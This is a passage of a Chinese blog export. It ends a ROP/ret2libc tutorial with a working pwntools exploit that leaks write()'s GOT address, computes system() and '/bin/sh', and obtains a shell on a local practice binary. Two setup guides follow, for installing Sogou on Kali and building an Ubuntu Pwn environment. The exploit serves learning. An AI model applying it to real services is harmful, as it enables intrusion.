class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python level2_exp.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./level2'</span>: pid 5731</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ whoami</span><br><span class="line">[*] Process <span class="string">'./level2'</span> stopped with <span class="built_in">exit</span> code -11 (SIGSEGV) (pid 5731)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure><p>如果你通过<code>sudo cat /proc/[pid]/maps</code>或者<code>ldd</code>查看，你会发现level2的<code>libc.so</code>地址每次都是变化的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/[第1次执行的level2的pid]/maps</span><br><span class="line">f7d63000-f7f13000 r-xp 00000000 08:01 404316                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">f7f13000-f7f15000 r--p 001af000 08:01 404316                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">f7f15000-f7f16000 rw-p 001b1000 08:01 404316                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line"></span><br><span class="line">cat /proc/[第2次执行的level2的pid]/maps</span><br><span class="line">f7d66000-f7f16000 r-xp 00000000 08:01 404316                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">f7f16000-f7f18000 r--p 001af000 08:01 404316                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">f7f18000-f7f19000 rw-p 001b1000 08:01 404316                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line"></span><br><span class="line">cat /proc/[第3次执行的level2的pid]/maps</span><br><span class="line">f7d4f000-f7eff000 r-xp 00000000 08:01 404316                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">f7eff000-f7f01000 r--p 001af000 08:01 404316                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">f7f01000-f7f02000 rw-p 001b1000 08:01 404316                             /lib/i386-linux-gnu/libc-2.23.so</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ldd level2</span><br><span class="line">    linux-gate.so.1 =&gt;  (0xf7f56000)</span><br><span class="line">    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d81000)</span><br><span class="line">    /lib/ld-linux.so.2 (0xf7f58000)</span><br><span class="line">$ ldd level2</span><br><span class="line">    linux-gate.so.1 =&gt;  (0xf7f1b000)</span><br><span class="line">    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d46000)</span><br><span class="line">    /lib/ld-linux.so.2 (0xf7f1d000)</span><br></pre></td></tr></table></figure><p>那么如何解决地址随机化的问题呢？思路是：我们需要先<code>泄漏</code>出libc.so<code>某些函数</code>在内存中的地址，然后再利用泄漏出的函数地址根据<code>偏移量</code>计算出<code>system()函数</code>和<code>/bin/sh字符串</code>在内存中的地址，然后再执行我们的<code>ret2libc</code>的shellcode。既然栈，libc，heap的地址都是随机的。我们怎么才能泄露出libc.so的地址呢？方法还是有的，因为<code>程序本身</code>在内存中的地址<code>并不是随机的</code>，如图所示：</p><div align="left"><br>    <img src="/resources/2018/2018-05-10-00.jpg" alt="Linux内存随机化分布图"><br></div><p>Linux内存随机化分布图</p><p>所以我们只要把返回值设置到<code>程序本身</code>就可执行我们期望的指令了。首先我们利用<code>objdump</code>来查看可以利用的<code>plt函数</code>和函数对应的<code>got表</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d -j .plt level2</span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">080482f0 &lt;<span class="built_in">read</span>@plt-0x10&gt;:</span><br><span class="line"> 80482f0:ff 35 04 a0 04 08    pushl  0x804a004</span><br><span class="line"> 80482f6:ff 25 08 a0 04 08    jmp    *0x804a008</span><br><span class="line"> 80482fc:00 00                add    %al,(%eax)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">08048300 &lt;<span class="built_in">read</span>@plt&gt;:</span><br><span class="line"> 8048300:ff 25 0c a0 04 08    jmp    *0x804a00c</span><br><span class="line"> 8048306:68 00 00 00 00       push   <span class="variable">$0x0</span></span><br><span class="line"> 804830b:e9 e0 ff ff ff       jmp    80482f0 &lt;_init+0x28&gt;</span><br><span class="line"></span><br><span class="line">08048310 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 8048310:ff 25 10 a0 04 08    jmp    *0x804a010</span><br><span class="line"> 8048316:68 08 00 00 00       push   <span class="variable">$0x8</span></span><br><span class="line"> 804831b:e9 d0 ff ff ff       jmp    80482f0 &lt;_init+0x28&gt;</span><br><span class="line"></span><br><span class="line">08048320 &lt;write@plt&gt;:</span><br><span class="line"> 8048320:ff 25 14 a0 04 08    jmp    *0x804a014</span><br><span class="line"> 8048326:68 10 00 00 00       push   <span class="variable">$0x10</span></span><br><span class="line"> 804832b:e9 c0 ff ff ff       jmp    80482f0 &lt;_init+0x28&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ objdump -R level2</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE </span><br><span class="line">08049ffc R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">0804a00c R_386_JUMP_SLOT   <span class="built_in">read</span>@GLIBC_2.0</span><br><span class="line">0804a010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a014 R_386_JUMP_SLOT   write@GLIBC_2.0</span><br></pre></td></tr></table></figure><p>我们发现除了程序本身的实现的函数之外，我们还可以使用<code>read@plt()</code>和<code>write@plt()</code>函数。但因为程序本身并没有调用<code>system()</code>函数，所以我们并不能直接调用<code>system()</code>来获取<code>shell</code>。但其实我们有<code>write@plt()</code>函数就够了，因为我们可以通过<code>write@plt ()</code>函数把<code>write()</code>函数在内存中的地址也就是<code>write.got</code>给打印出来。既然write()函数实现是在<code>libc.so</code>当中，那我们调用的<code>write@plt()</code>函数为什么也能实现write()功能呢? 这是因为linux采用了<code>延时绑定</code>技术，当我们调用<code>write@plit()</code>的时候，系统会将真正的write()函数地址<code>link</code>到got表的<code>write.got</code>中，然后write@plit()会根据write.got 跳转到<code>真正的write()函数</code>上去。（如果还是搞不清楚的话，推荐阅读《程序员的自我修养 - 链接、装载与库》这本书）</p><p>因为<code>system()</code>函数和<code>write()</code>在<code>libc.so</code>中的<code>offset(相对地址)</code>是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以<code>计算出system()</code>在内存中的<code>地址</code>了。然后我们再将pc指针<code>return</code>回vulnerable_function()函数，就可以进行<code>ret2libc溢出攻击</code>，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。</p><p>使用<code>ldd</code>命令可以查看目标程序调用的so库。随后我们把<code>libc.so</code>拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ldd level2</span><br><span class="line">    linux-gate.so.1 =&gt;  (0xf7f84000)</span><br><span class="line">    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7daf000)</span><br><span class="line">    /lib/ld-linux.so.2 (0xf7f86000)</span><br><span class="line">$ cp /lib/i386-linux-gnu/libc.so.6 .</span><br></pre></td></tr></table></figure><p>最后exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'libc.so'</span>)</span><br><span class="line">elf = ELF(<span class="string">'level2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./level2')</span></span><br><span class="line">p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'plt_write= '</span> + hex(plt_write)</span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'got_write= '</span> + hex(got_write)</span><br><span class="line">vulfun_addr = <span class="number">0x08048471</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'vulfun= '</span> + hex(vulfun_addr)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###sending payload1 ...###"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###receving write() addr...###"</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'write_addr='</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###calculating system() addr and \"/bin/sh\" addr...###"</span></span><br><span class="line">system_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system_addr= '</span> + hex(system_addr)</span><br><span class="line">binsh_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - next(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'binsh_addr= '</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">140</span>  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###sending payload2 ...###"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>接着我们使用<code>socat</code>把level2绑定到<code>10003端口</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:10003,fork EXEC:./level2</span><br></pre></td></tr></table></figure><p>最后执行我们的exp：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ python level3_exp.py</span><br><span class="line">[*] <span class="string">'/home/buffer/\xe6\xa1\x8c\xe9\x9d\xa2/practice/ROP_x86/0x03/libc.so'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/home/buffer/\xe6\xa1\x8c\xe9\x9d\xa2/practice/ROP_x86/0x03/level2'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[+] Opening connection to 127.0.0.1 on port 10003: Done</span><br><span class="line">write_plt= 0x8048320</span><br><span class="line">write_got= 0x804a014</span><br><span class="line">vulfun_addr= 0x8048471</span><br><span class="line"></span><br><span class="line"><span class="comment">###sending payload1 ...###</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###receving write() addr...###</span></span><br><span class="line">write_addr= 0xf7df3b70</span><br><span class="line"></span><br><span class="line"><span class="comment">###calculating system() addr and "/bin/sh" addr...###</span></span><br><span class="line">system_addr= 0xf7d58da0</span><br><span class="line">binsh_addr= 0xf7e79a0b</span><br><span class="line"></span><br><span class="line"><span class="comment">###sending payload2 ...###</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">buffer</span><br></pre></td></tr></table></figure><h3 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h3><p>本章简单介绍了<code>ROP攻击</code>的基本原理，由于篇幅原因，我们会在随后的文章中会介绍更多的攻击技巧：如何利用工具寻找<code>gadgets</code>，如何在<code>不知道对方libc.so版本</code>的情况下<code>计算offset</code>；如何<code>绕过Stack Protector</code>等。欢迎大家到时继续学习。另外本文提到的所有源代码和工具都可以从我的github下载：</p><div class="github-widget" data-repo="zhengmin1989/ROP_STEP_BY_STEP"></div><h3 id="0x05-参考文献"><a href="#0x05-参考文献" class="headerlink" title="0x05 参考文献"></a>0x05 参考文献</h3><blockquote><ol><li>The geometry of innocent flesh on the bone: return-into-libc without function calls (on the x86)</li><li>picoCTF 2013: <a href="https://github.com/picoCTF/2013-Problems" target="_blank" rel="noopener">https://github.com/picoCTF/2013-Problems</a></li><li>Smashing The Stack For Fun And Profit: <a href="http://phrack.org/issues/49/14.html" target="_blank" rel="noopener">http://phrack.org/issues/49/14.html</a></li><li>程序员的自我修养</li><li>ROP轻松谈</li></ol></blockquote>]]></content>
      
      <categories>
          
          <category> 备份 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> Linux </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Kali2018-搜狗输入法安装</title>
      <link href="/2018/04/08/Kali2018-%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E5%AE%89%E8%A3%85/"/>
      <url>/2018/04/08/Kali2018-%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E5%AE%89%E8%A3%85/</url>
      <content type="html"><![CDATA[<blockquote><p>有点无语，Kali虚拟机也崩了，和Ubuntu一个情况。<br>以前版本的Kali安装搜狗输入法还是没有多大问题的，kali更新了fcitx<br>官方废弃了两个搜狗输入法需要的依赖包：fcitx-libs和fcitx-libs-qt，不需要这俩依赖就能运行。<br><a id="more"></a></p></blockquote><h3 id="Kali-Linux版本为2018以前的"><a href="#Kali-Linux版本为2018以前的" class="headerlink" title="Kali Linux版本为2018以前的"></a>Kali Linux版本为2018以前的</h3><p>Kali Linux2018以前的版本需要安装<code>fcitx-libs</code>和<code>fcitx-libs-qt</code>，因为搜狗输入法是基于<code>fcitx</code>的。</p><h4 id="fcitx安装"><a href="#fcitx安装" class="headerlink" title="fcitx安装"></a>fcitx安装</h4><blockquote><p><code>fcitx介绍</code><br>Fcitx是 (Free Chinese Input Toy for X) 的英文缩写，中文名为小企鹅输入法，是一个以 GPL 方式发布的输入法框架， 编写它的目是为桌面环境提供一个灵活的输入方案，彻底解决在GNU/Linux下没有一个好的中文输入法的问题。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#换完源之后执行</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">sudo apt-get install fcitx</span><br><span class="line">sudo apt-get install fcitx-libs</span><br><span class="line">sudo apt-get install fcitx-libs-qt</span><br></pre></td></tr></table></figure><p>顺利的话会自动安装成功，如果遇到依赖错误，按提示修复或者输入<code>apt-get -f install</code> 修复，但是如果提示“依赖xxx，但是xxx将不会被安装”，这一般是源太旧，建议换个其他的源。</p><h4 id="安装搜狗输入法"><a href="#安装搜狗输入法" class="headerlink" title="安装搜狗输入法"></a>安装搜狗输入法</h4><p>搜狗输入法 for Linux下载官方网站：<a href="http://pinyin.sogou.com/linux/" target="_blank" rel="noopener">http://pinyin.sogou.com/linux/</a><br>下载和自己系统版本对应的<code>deb包</code>，我这里下载的是64bit的。<br>然后执行下列命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/Downloads/</span><br><span class="line">dpkg -i 下载的搜狗输入法软件包名</span><br></pre></td></tr></table></figure><p>如果提示有软件包依赖的问题，根据提示执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get --fix-broken install</span><br></pre></td></tr></table></figure><p>然后<code>reboot</code>重启Kali，重新开机后就可以使用搜狗输入法了，可以使用ctrl+空格 或者 Ctrl+shift进行切换输入法。如果还是不行，去<code>fcitx配置</code>里将搜狗输入法设为默认输入法应该就可以了。</p><h3 id="Kali-Linux-2018安装搜狗输入法"><a href="#Kali-Linux-2018安装搜狗输入法" class="headerlink" title="Kali Linux 2018安装搜狗输入法"></a>Kali Linux 2018安装搜狗输入法</h3><p>由于Kali2018更新了fcitx的版本，删除了<code>fcitx-libs</code>和<code>fcitx-libs-qt</code>这两个依赖，所以我们要将deb包打开，删除掉这两个依赖，<code>重新打包</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#下载搜狗deb包</span><br><span class="line">wget -O sogoupinyin_2.2.0.0102_amd64.deb &quot;http://pinyin.sogou.com/linux/download.php?f=linux&amp;bit=64&quot;</span><br><span class="line"></span><br><span class="line">#创建解压后软件包目录，-p参数表示如果父目录不存在就创建父目录</span><br><span class="line">mkdir -p extract/DEBIAN</span><br><span class="line"></span><br><span class="line">#将所有文件解压到extract下</span><br><span class="line">dpkg-deb -x sogoupinyin_2.2.0.0102_amd64.deb extract/</span><br><span class="line"></span><br><span class="line">#将主控信息解压到extract下的DEBIAN文件夹下</span><br><span class="line">dpkg-deb -e sogoupinyin_2.2.0.0102_amd64.deb extract/DEBIAN</span><br><span class="line"></span><br><span class="line">#用vim打开extract/DEBIAN/下的control文件，找到Depends行，去除fcitx-libs和fcitx-libs-qt相关信息，保存退出</span><br><span class="line">vim extract/DEBIAN/control</span><br><span class="line"></span><br><span class="line">#新建打包目录</span><br><span class="line">mkdir build</span><br><span class="line"></span><br><span class="line">#重新打包</span><br><span class="line">dpkg-deb -b extract/ build/</span><br><span class="line"></span><br><span class="line">#安装搜狗输入法</span><br><span class="line">dpkg -i build/sogoupinyin_2.1.0.0086_amd64.deb</span><br></pre></td></tr></table></figure><div align="left"><br>    <img src="/resources/2018/2018-04-08-00.png" alt="control"><br></div><p>然后reboot重启一下，重新开机就可以使用了。不能使用也是要设置一下fcitx配置。</p><h3 id="搜狗输入法候选框乱码"><a href="#搜狗输入法候选框乱码" class="headerlink" title="搜狗输入法候选框乱码"></a>搜狗输入法候选框乱码</h3><p>删除～/.config中所有与搜狗输入法有关的文件或文件夹，reboot就好了。</p>]]></content>
      
      <categories>
          
          <category> 备忘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn环境搭建——Ubuntu16.04</title>
      <link href="/2018/04/05/Pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-Ubuntu16.04/"/>
      <url>/2018/04/05/Pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-Ubuntu16.04/</url>
      <content type="html"><![CDATA[<blockquote><p>有点无语，Ubuntu虚拟机崩了，据我估计应该是VMware14的问题。<br>虚拟机打不开，一直黑屏状态，实在没办法了才删了重新装一遍。<br>写这篇博客的目的就是记录一下安装的过程和安装中遇到的问题！！！<br><a id="more"></a></p></blockquote><p>&emsp;&emsp;前面我的虚拟机是用 <code>VMware12pro</code>建的，然后重新安装了物理机的系统，就把VMware换成<code>VMware14pro</code>了。前一段时间，一个朋友问我遇到过虚拟机黑屏打不开是怎么回事，因为之前也没遇到过，所以我也不知道。直到最近我才遇到了这个问题，因为之前用VMware12建的，不知道是因为在VMware14下打开VMware12的虚拟机导致的(<strong>硬件兼容性</strong>)，还是由于VMware14本身的原因。我在网上搜索了一下，很多用VMware14的人都遇到过这种问题，也找到了一些解决方法，但是我都没成功，所以只能狠心重装了。</p><h2 id="Ubuntu基本环境搭建"><a href="#Ubuntu基本环境搭建" class="headerlink" title="Ubuntu基本环境搭建"></a>Ubuntu基本环境搭建</h2><blockquote><p><code>环境描述</code>:<br>1、VMware Workstations 12 Pro 下载地址：<a href="https://pan.baidu.com/s/11HZr3mv5GX1lCjmv1_ZuIQ" target="_blank" rel="noopener">https://pan.baidu.com/s/11HZr3mv5GX1lCjmv1_ZuIQ</a><br>2、Ubuntu16.04  下载地址：<a href="https://www.ubuntu.com/download/desktop" target="_blank" rel="noopener">https://www.ubuntu.com/download/desktop</a><br>3、换源<br>4、VMware-Tools、aptitude、vim、搜狗输入法、oh-my-zsh等软件的安装</p></blockquote><h3 id="Ubuntu16-04虚拟机的安装"><a href="#Ubuntu16-04虚拟机的安装" class="headerlink" title="Ubuntu16.04虚拟机的安装"></a>Ubuntu16.04虚拟机的安装</h3><p>这样的文章很多，我就不写了，写了也没啥意义，还浪费时间。这里粘一个别人写的文章的链接。<a href="https://blog.csdn.net/colin_lisicong/article/details/70193539" target="_blank" rel="noopener">VMware 12Pro安装Ubuntu16.04</a></p><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><p>由于Ubuntu官方的源是国外的，所以速度很慢，要把它换成国内的镜像站，那样,不管是更新、还是安装软件，都是比较快的。</p><p><code>官方源</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ xenial main restricted</span><br><span class="line"># deb-src http://cn.archive.ubuntu.com/ubuntu/ xenial main restricted</span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ xenial-updates main restricted</span><br><span class="line"># deb-src http://cn.archive.ubuntu.com/ubuntu/ xenial-updates main restricted</span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ xenial universe</span><br><span class="line"># deb-src http://cn.archive.ubuntu.com/ubuntu/ xenial universe</span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ xenial-updates universe</span><br><span class="line"># deb-src http://cn.archive.ubuntu.com/ubuntu/ xenial-updates universe</span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ xenial multiverse</span><br><span class="line"># deb-src http://cn.archive.ubuntu.com/ubuntu/ xenial multiverse</span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ xenial-updates multiverse</span><br><span class="line"># deb-src http://cn.archive.ubuntu.com/ubuntu/ xenial-updates multiverse</span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line"># deb-src http://cn.archive.ubuntu.com/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line"># deb http://archive.canonical.com/ubuntu xenial partner</span><br><span class="line"># deb-src http://archive.canonical.com/ubuntu xenial partner</span><br><span class="line">deb http://security.ubuntu.com/ubuntu xenial-security main restricted</span><br><span class="line"># deb-src http://security.ubuntu.com/ubuntu xenial-security main restricted</span><br><span class="line">deb http://security.ubuntu.com/ubuntu xenial-security universe</span><br><span class="line"># deb-src http://security.ubuntu.com/ubuntu xenial-security universe</span><br><span class="line">deb http://security.ubuntu.com/ubuntu xenial-security multiverse</span><br><span class="line"># deb-src http://security.ubuntu.com/ubuntu xenial-security multiverse</span><br></pre></td></tr></table></figure></p><p>就贴一个官方的，网上搜了下也没搜见完整的官方源，我把注释都去了</p><table><thead><tr><th style="text-align:center">源名称</th><th style="text-align:center">源链接</th></tr></thead><tbody><tr><td style="text-align:center"><strong><code>清华源</code></strong></td><td style="text-align:center"><a href="https://mirrors.tuna.tsinghua.edu.cn/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/</a></td></tr><tr><td style="text-align:center"><strong><code>网易源</code></strong></td><td style="text-align:center"><a href="http://mirrors.163.com/" target="_blank" rel="noopener">http://mirrors.163.com/</a></td></tr><tr><td style="text-align:center"><strong><code>中科大源</code></strong></td><td style="text-align:center"><a href="http://mirrors.ustc.edu.cn/" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/</a></td></tr><tr><td style="text-align:center"><strong><code>阿里源</code></strong></td><td style="text-align:center"><a href="https://opsx.alibaba.com/mirror/" target="_blank" rel="noopener">https://opsx.alibaba.com/mirror/</a></td></tr><tr><td style="text-align:center"><strong><code>搜狐源</code></strong></td><td style="text-align:center"><a href="http://mirrors.sohu.com/" target="_blank" rel="noopener">http://mirrors.sohu.com/</a></td></tr><tr><td style="text-align:center"><strong><code>华科大源</code></strong></td><td style="text-align:center"><a href="http://mirror.hust.edu.cn/" target="_blank" rel="noopener">http://mirror.hust.edu.cn/</a></td></tr><tr><td style="text-align:center"><strong><code>浙大源</code></strong></td><td style="text-align:center"><a href="http://mirrors.zju.edu.cn/" target="_blank" rel="noopener">http://mirrors.zju.edu.cn/</a></td></tr><tr><td style="text-align:center"><strong><code>上海交大源</code></strong></td><td style="text-align:center"><a href="http://ftp.sjtu.edu.cn/" target="_blank" rel="noopener">http://ftp.sjtu.edu.cn/</a></td></tr></tbody></table><p>每个开源镜像站都有介绍不同版本的Linux的源的使用方式，访问上述网址就行了。首先找到/etc/apt下的sources.list,先将其备份一个，然后将上述镜像站的源替换sources.list里的官方源并保存。然后执行下面两条命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update 更新源  </span><br><span class="line">sudo apt-get upgrade 更新软件</span><br></pre></td></tr></table></figure></p><h3 id="安装open-vm-tools"><a href="#安装open-vm-tools" class="headerlink" title="安装open-vm-tools"></a>安装open-vm-tools</h3><p>前面安装的是VMware提供的<code>VMware 